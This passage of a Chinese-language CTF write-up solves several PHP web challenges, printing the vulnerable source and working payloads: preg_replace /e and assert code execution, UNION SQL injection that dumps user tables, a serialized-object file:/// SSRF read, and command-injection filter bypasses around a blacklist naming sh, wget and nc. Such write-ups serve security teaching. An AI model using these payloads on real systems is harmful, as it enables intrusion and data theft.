echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">        &lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">            &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">                &lt;?php</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#x27;input&#x27;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#x27;ta:text&#x27;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#x27;text&#x27;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if ($page === &#x27;index.php&#x27;) &#123;</span><br><span class="line">                    die(&#x27;Ok&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">                    include($page);</span><br><span class="line">                    die();</span><br><span class="line">                ?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>关键部分就是最后的内部功能，payload：</p>
<ol>
<li><p>XFF 头是<code>127.0.0.1</code>，很多插件都可以实现<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210831154447334.png" alt="image-20210831154447334"></p>
</li>
<li><p><code>preg_replace($pattern, $replacement, $subject);</code>函数使用 <code>/e</code>模式，导致代码执行的问题<br>参考：<a href="https://www.sqlsec.com/2020/07/preg_replace.html">PHP preg_系列漏洞小结 | 国光 (sqlsec.com)</a></p>
</li>
<li><p>所以<code>?pat=/1/e&amp;rep=system(&#39;cat s3chahahaDir/flag/flag.php&#39;)&amp;sub=1</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210831164502945.png" alt="image-20210831164502945"></p>
</li>
</ol>
<h3 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h3><p>git泄露，用Githack得到原始结构目录的源码</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210820153749371.png" alt="image-20210820153749371"></p>
<p>打开flag.php没有发现flag，应该是删掉了，但是位置应该还是没变，对index.php源码审计：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;page&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">	$page = $_GET[&#x27;page&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	$page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">// TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>aseert函数可以任意执行代码，<code>or die()</code>指的是如果前面的值为false则执行括号里面的内容，两个aseert都能利用：</p>
<ol>
<li><code>?page=1&#39;,&#39;2&#39;) === false and highlight_file(&#39;templates/flag.php&#39;) and strpos(&#39;templates/flag</code></li>
<li><code>?page=&#39;).system(&quot;cat%20templates/flag.php&quot;);//</code></li>
</ol>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>代码审计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;</span><br><span class="line"></span><br><span class="line">function encode($str)&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    // echo $_o;</span><br><span class="line">        </span><br><span class="line">    for($_0=0;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,1);</span><br><span class="line">        $__=ord($_c)+1;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    return str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">/*</span><br><span class="line">   逆向加密算法，解密$miwen就是flag</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>思路已经很明确了，就是逆向解密<code>$miwen</code>。</p>
<p>先把变量命名给改了，然后逆向解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">function decode($miwen)&#123;</span><br><span class="line">   $mingwen=&#x27;&#x27;;</span><br><span class="line">   $miwen=base64_decode(strrev(str_rot13($miwen)));</span><br><span class="line">   $strrev=strrev($miwen);</span><br><span class="line">   for ($i=0; $i &lt; strlen($strrev); $i++) &#123; </span><br><span class="line">       </span><br><span class="line">   	    $char=substr($strrev,$i,1);  </span><br><span class="line">        $ordchar=ord($char)-1;  </span><br><span class="line">        $char=chr($ordchar);  </span><br><span class="line">        $mingwen=$mingwen.$char;</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br><span class="line">   return $mingwen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$miwen=&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;;</span><br><span class="line">echo decode($miwen);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h3><p><code>dirb</code>扫描结果（或者<code>nikto</code>等别的扫描工具）</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013190942893.png" alt="image-20211013190942893"></p>
<p>可以知道flag.php就是我们要得到的</p>
<p>访问<code>/robots.txt</code>发现<code>user.php.bak</code>源码泄露</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们知道两点：</p>
<ol>
<li>这道题有可能和反序列化有关</li>
<li>get函数的<a href="https://blog.csdn.net/Fly_hps/article/details/83046613">Curl 导致 SSRF 及 WAF 绕过方式</a></li>
</ol>
<p>我们进入页面，注册账号，发现usename可以点，跳转到如下界面</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013224122689.png" alt="image-20211013224122689"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013224156936.png" alt="image-20211013224156936"></p>
<p><code>?no=1</code>有可能是sql注入，尝试注入。</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013231448634.png" alt="image-20211013231448634"></p>
<p>首先回显2，在username下面，说明成功；</p>
<p>同时我们看到，还有<code>unserialize</code>函数失败，同时<code>age</code>、<code>blog</code>和<code>the cotents of blog</code>都报错没有对象，联系到之前的源码，这三个内容都是由一个序列化的对象反序列化得到的。</p>
<p>接下来我们查看数据库：</p>
<ol>
<li><code>?no=0 union/**/select 1,version(),3,4--</code>，查看数据库版本<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013231807004.png" alt="image-20211013231807004"></li>
<li><code>?no=0 union/**/select 1,database(),3,4--</code>，查看数据库名字<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013231953403.png" alt="image-20211013231953403"></li>
<li><code>?no=0 union/**/select 1,(select group_concat(schema_name) from information_schema.schemata),3,4--</code>，查看所有的数据库表名<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013232707915.png" alt="image-20211013232707915"></li>
<li><code>?no=0 union/**/select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4--</code>，查看<code>fakebook</code>数据库的表名<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013233244724.png" alt="image-20211013233244724"></li>
<li><code>?no=0 union/**/select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3,4--</code>，查看users字段名<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013233901324.png" alt="image-20211013233901324"></li>
<li><code>?no=0 union/**/select 1,(select group_concat(no,username,passwd,data) from fakebook.users),3,4--</code>，查看字段名的值<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211013234108197.png" alt="image-20211013234108197"></li>
</ol>
<p>看到data字段储存的是序列化的对象，我们现在回到之前的思路：将data字段的值设置成一个序列化的对象，然后得到内容。</p>
<p>因为curl在权限够的情况下，可以通过file协议读取本地文件，所以payload如下：</p>
<p><code>?no=0/**/union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211014154306572.png" alt="image-20211014154306572"></p>
<p>如果直接在注册的时候将blog注册为flag.php，不能通过isValidBlog ()函数的检测</p>
<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><h3 id="favorite-number"><a href="#favorite-number" class="headerlink" title="favorite number"></a>favorite number</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php5.5.9</span></span><br><span class="line"><span class="variable">$stuff</span> = <span class="variable">$_POST</span>[<span class="string">&quot;stuff&quot;</span>];</span><br><span class="line"><span class="variable">$array</span> = [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$stuff</span> === <span class="variable">$array</span> &amp;&amp; <span class="variable">$stuff</span>[<span class="number">0</span>] != <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$num</span>= <span class="variable">$_POST</span>[<span class="string">&quot;num&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^\d+$/im&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#x27;|\&quot;|\|/i&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;my favorite num is:&quot;</span>;</span><br><span class="line">            system(<span class="string">&quot;echo &quot;</span>.<span class="variable">$num</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Bonjour!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先是POST传入，然后我们需要绕过这几个点，system执行命令：</p>
<ol>
<li><p><code>$stuff === $array &amp;&amp; $stuff[0] != &#39;admin&#39;</code>也就是说<code>stuff[0]</code>要同时等于和不等于<code>admin</code>，其实这一步就是最难的<br>我们可以看到，在php 5.5.9版本存在的这个漏洞，所以stuff如下：<br><code>stuff[4294967296]=admin&amp;stuff[1]=user</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015155414421.png" alt="image-20211015155414421"><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015155801077.png" alt="image-20211015155801077"></p>
</li>
<li><p><code>preg_match(&quot;/^\d+$/im&quot;,$num)</code>，表示<code>num</code>是要由纯数字组成的字符串，但是我们要让<code>num</code>是一个命令，关键在于<code>/m</code>模式，所以我们要通过<code>%0a</code>换行绕过它，我们的payload更新如下:<br><code>stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=1%0als</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015162001426.png" alt="image-20211015162001426"></p>
</li>
<li><p><code>!preg_match(&quot;/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|&#39;|\&quot;|\|/i&quot;,$num</code>，我们的命令要避开这些字符，然后还要得到flag，可以看到flag都被过滤了，这里有两个思路：</p>
<ol>
<li><p>command：tac `find -inum xxxx`<br>用inode索引节点，先找到flag文件的inode，然后用tac读取find找到的flag文件得到flag<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015162230878.png" alt="image-20211015162230878"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015162534293.png" alt="image-20211015162534293"></p>
</li>
<li><p>command: printf /fla &gt; /tmp/target; printf g &gt;&gt; /tmp/target ; tac `tac /tmp/target`<br>思路是tac读取/tmp/target文件保存的<code>/flag</code>，得到flag。<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015165226482.png" alt="image-20211015165226482"></p>
</li>
<li><p>command: tac /fla$1g<br>思路是$1变量为空，所以最后还是执行<code>tac /flag</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015170613255.png" alt="image-20211015170613255"><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015170628858.png" alt="image-20211015170628858"></p>
</li>
<li><p>command: a=fla;b=g; tac /$a$b<br>拼接变量，执行<code>tac /flag</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211015170942675.png" alt="image-20211015170942675"></p>
</li>
</ol>
</li>
</ol>
<h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h3><p>   进去看到home是个卖彩票的页面，全对奖励50000。buy是购买彩票的界面，还要注册一个用户名不要密码。account显示钱包和名字。</p>
<p>   最后一个claim your price界面，如果我们有99990000的钱就可以购买flag。</p>
<p>   <img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211016001448571.png" alt="image-20211016001448571"></p>
<p>   现在我们想要通过买彩票去刷钱，发现都是随机数，挣不到钱。</p>
<p>   dirb扫描结果：</p>
<p>   <img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211016001734639.png" alt="image-20211016001734639"></p>
<p>   发现.git泄漏，robots.txt也证明是.git泄漏。</p>
<p>   用<code>githacker --url http://111.200.241.244:52967/ --folder result</code>得到源码</p>
<p>   Seay打开审计代码，我们目的是知道怎么去刷钱，所以去看buy.php</p>
   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php include(&#x27;check_register.php&#x27;);include(&#x27;header.php&#x27;); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h2&gt;Buy a lottery!&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;numbers&quot; id=&quot;numbers&quot; minlength=&quot;7&quot; maxlength=&quot;7&quot; pattern=&quot;\d&#123;7&#125;&quot; required placeholder=&quot;7 numbers&quot;&gt;</span><br><span class="line">&lt;button type=&quot;button&quot; id=&quot;btnBuy&quot;&gt;Buy!&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;js/buy.js&quot;&gt;&lt;/script&gt;   //js/buy.js</span><br><span class="line">&lt;p id=&quot;wait&quot; class=&quot;alert alert-info&quot; style=&quot;display: none;&quot;&gt;Please wait...&lt;/p&gt;</span><br><span class="line">&lt;div id=&quot;result&quot; style=&quot;display: none;&quot;&gt;</span><br><span class="line">	&lt;p id=&quot;info&quot; class=&quot;alert alert-info&quot;&gt;Prize: &lt;span id=&quot;prize&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">	&lt;p&gt;</span><br><span class="line">		&lt;span style=&quot;width: 10em; display: inline-block;&quot;&gt;Winning numbers:&lt;/span&gt;</span><br><span class="line">		&lt;div id=&quot;win&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/p&gt;</span><br><span class="line">	&lt;p&gt;</span><br><span class="line">		&lt;span style=&quot;width: 10em; display: inline-block;&quot;&gt;Your numbers:&lt;/span&gt;</span><br><span class="line">		&lt;div id=&quot;user&quot;&gt;</span><br><span class="line">			&lt;span class=&quot;number-ball number-ball-red&quot;&gt;1&lt;/span&gt;</span><br><span class="line">			&lt;span class=&quot;number-ball number-ball-gray&quot;&gt;6&lt;/span&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php include(&#x27;footer.php&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>

<p>   追踪到<code>js/buy.js</code></p>
   <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&#x27;#wait&#x27;</span>).show();</span><br><span class="line">	$(<span class="string">&#x27;#result&#x27;</span>).hide();</span><br><span class="line">	<span class="keyword">var</span> input = $(<span class="string">&#x27;#numbers&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">if</span>(input.validity.valid)&#123;</span><br><span class="line">		<span class="keyword">var</span> numbers = input.value;</span><br><span class="line">		$.ajax(&#123;</span><br><span class="line">		  <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">		  <span class="attr">url</span>: <span class="string">&quot;api.php&quot;</span>,                                            <span class="comment">//api.php</span></span><br><span class="line">		  <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">		  <span class="attr">contentType</span>: <span class="string">&quot;application/json&quot;</span>, </span><br><span class="line">		  <span class="attr">data</span>: <span class="built_in">JSON</span>.stringify(&#123; <span class="attr">action</span>: <span class="string">&quot;buy&quot;</span>, <span class="attr">numbers</span>: numbers &#125;)</span><br><span class="line">		&#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">resp</span>)</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(resp.status == <span class="string">&#x27;ok&#x27;</span>)&#123;</span><br><span class="line">				show_result(resp);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				alert(resp.msg);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		alert(<span class="string">&#x27;invalid&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$(<span class="string">&#x27;#wait&#x27;</span>).hide();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_result</span>(<span class="params">resp</span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&#x27;#prize&#x27;</span>).text(resp.prize);</span><br><span class="line">	<span class="keyword">var</span> numbers = resp.numbers;</span><br><span class="line">	<span class="keyword">var</span> win_numbers = resp.win_numbers;</span><br><span class="line">	<span class="keyword">var</span> numbers_result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">var</span> win_numbers_result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">		win_numbers_result += <span class="string">&#x27;&lt;span class=&quot;number-ball number-ball-red&quot;&gt;&#x27;</span> + win_numbers[i] + <span class="string">&#x27;&lt;/span&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(numbers[i] == win_numbers[i])&#123;</span><br><span class="line">			numbers_result += <span class="string">&#x27;&lt;span class=&quot;number-ball number-ball-red&quot;&gt;&#x27;</span> + numbers[i] + <span class="string">&#x27;&lt;/span&gt;&#x27;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			numbers_result += <span class="string">&#x27;&lt;span class=&quot;number-ball number-ball-gray&quot;&gt;&#x27;</span> + numbers[i] + <span class="string">&#x27;&lt;/span&gt;&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$(<span class="string">&#x27;#win&#x27;</span>).html(win_numbers_result);</span><br><span class="line">	$(<span class="string">&#x27;#user&#x27;</span>).html(numbers_result);</span><br><span class="line">	$(<span class="string">&#x27;#money&#x27;</span>).text(resp.money);</span><br><span class="line">	$(<span class="string">&#x27;#result&#x27;</span>).show();</span><br><span class="line">	$(<span class="string">&#x27;#numbers&#x27;</span>).select()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">&#x27;#btnBuy&#x27;</span>).click(buy);	</span><br><span class="line">	$(<span class="string">&#x27;form&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"> event </span>) </span>&#123;</span><br><span class="line">	  buy();</span><br><span class="line">	  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>   看到数据发送到<code>api.php</code>，下面是部分源码，关键函数是buy函数：<br>   <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// my boss told me to use cryptographically secure algorithm </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_num</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="variable">$byte</span> = openssl_random_pseudo_bytes(<span class="number">10</span>, <span class="variable">$cstrong</span>);</span><br><span class="line">		<span class="variable">$num</span> = ord(<span class="variable">$byte</span>);</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="variable">$num</span> &gt;= <span class="number">250</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$cstrong</span>)&#123;</span><br><span class="line">		response_error(<span class="string">&#x27;server need be checked, tell admin&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$num</span> /= <span class="number">25</span>;</span><br><span class="line">	<span class="keyword">return</span> strval(floor(<span class="variable">$num</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_win_nums</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="variable">$result</span> .= random_num();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">	<span class="variable">$win_numbers</span> = random_win_nums();                        <span class="comment">//得到</span></span><br><span class="line">	<span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span 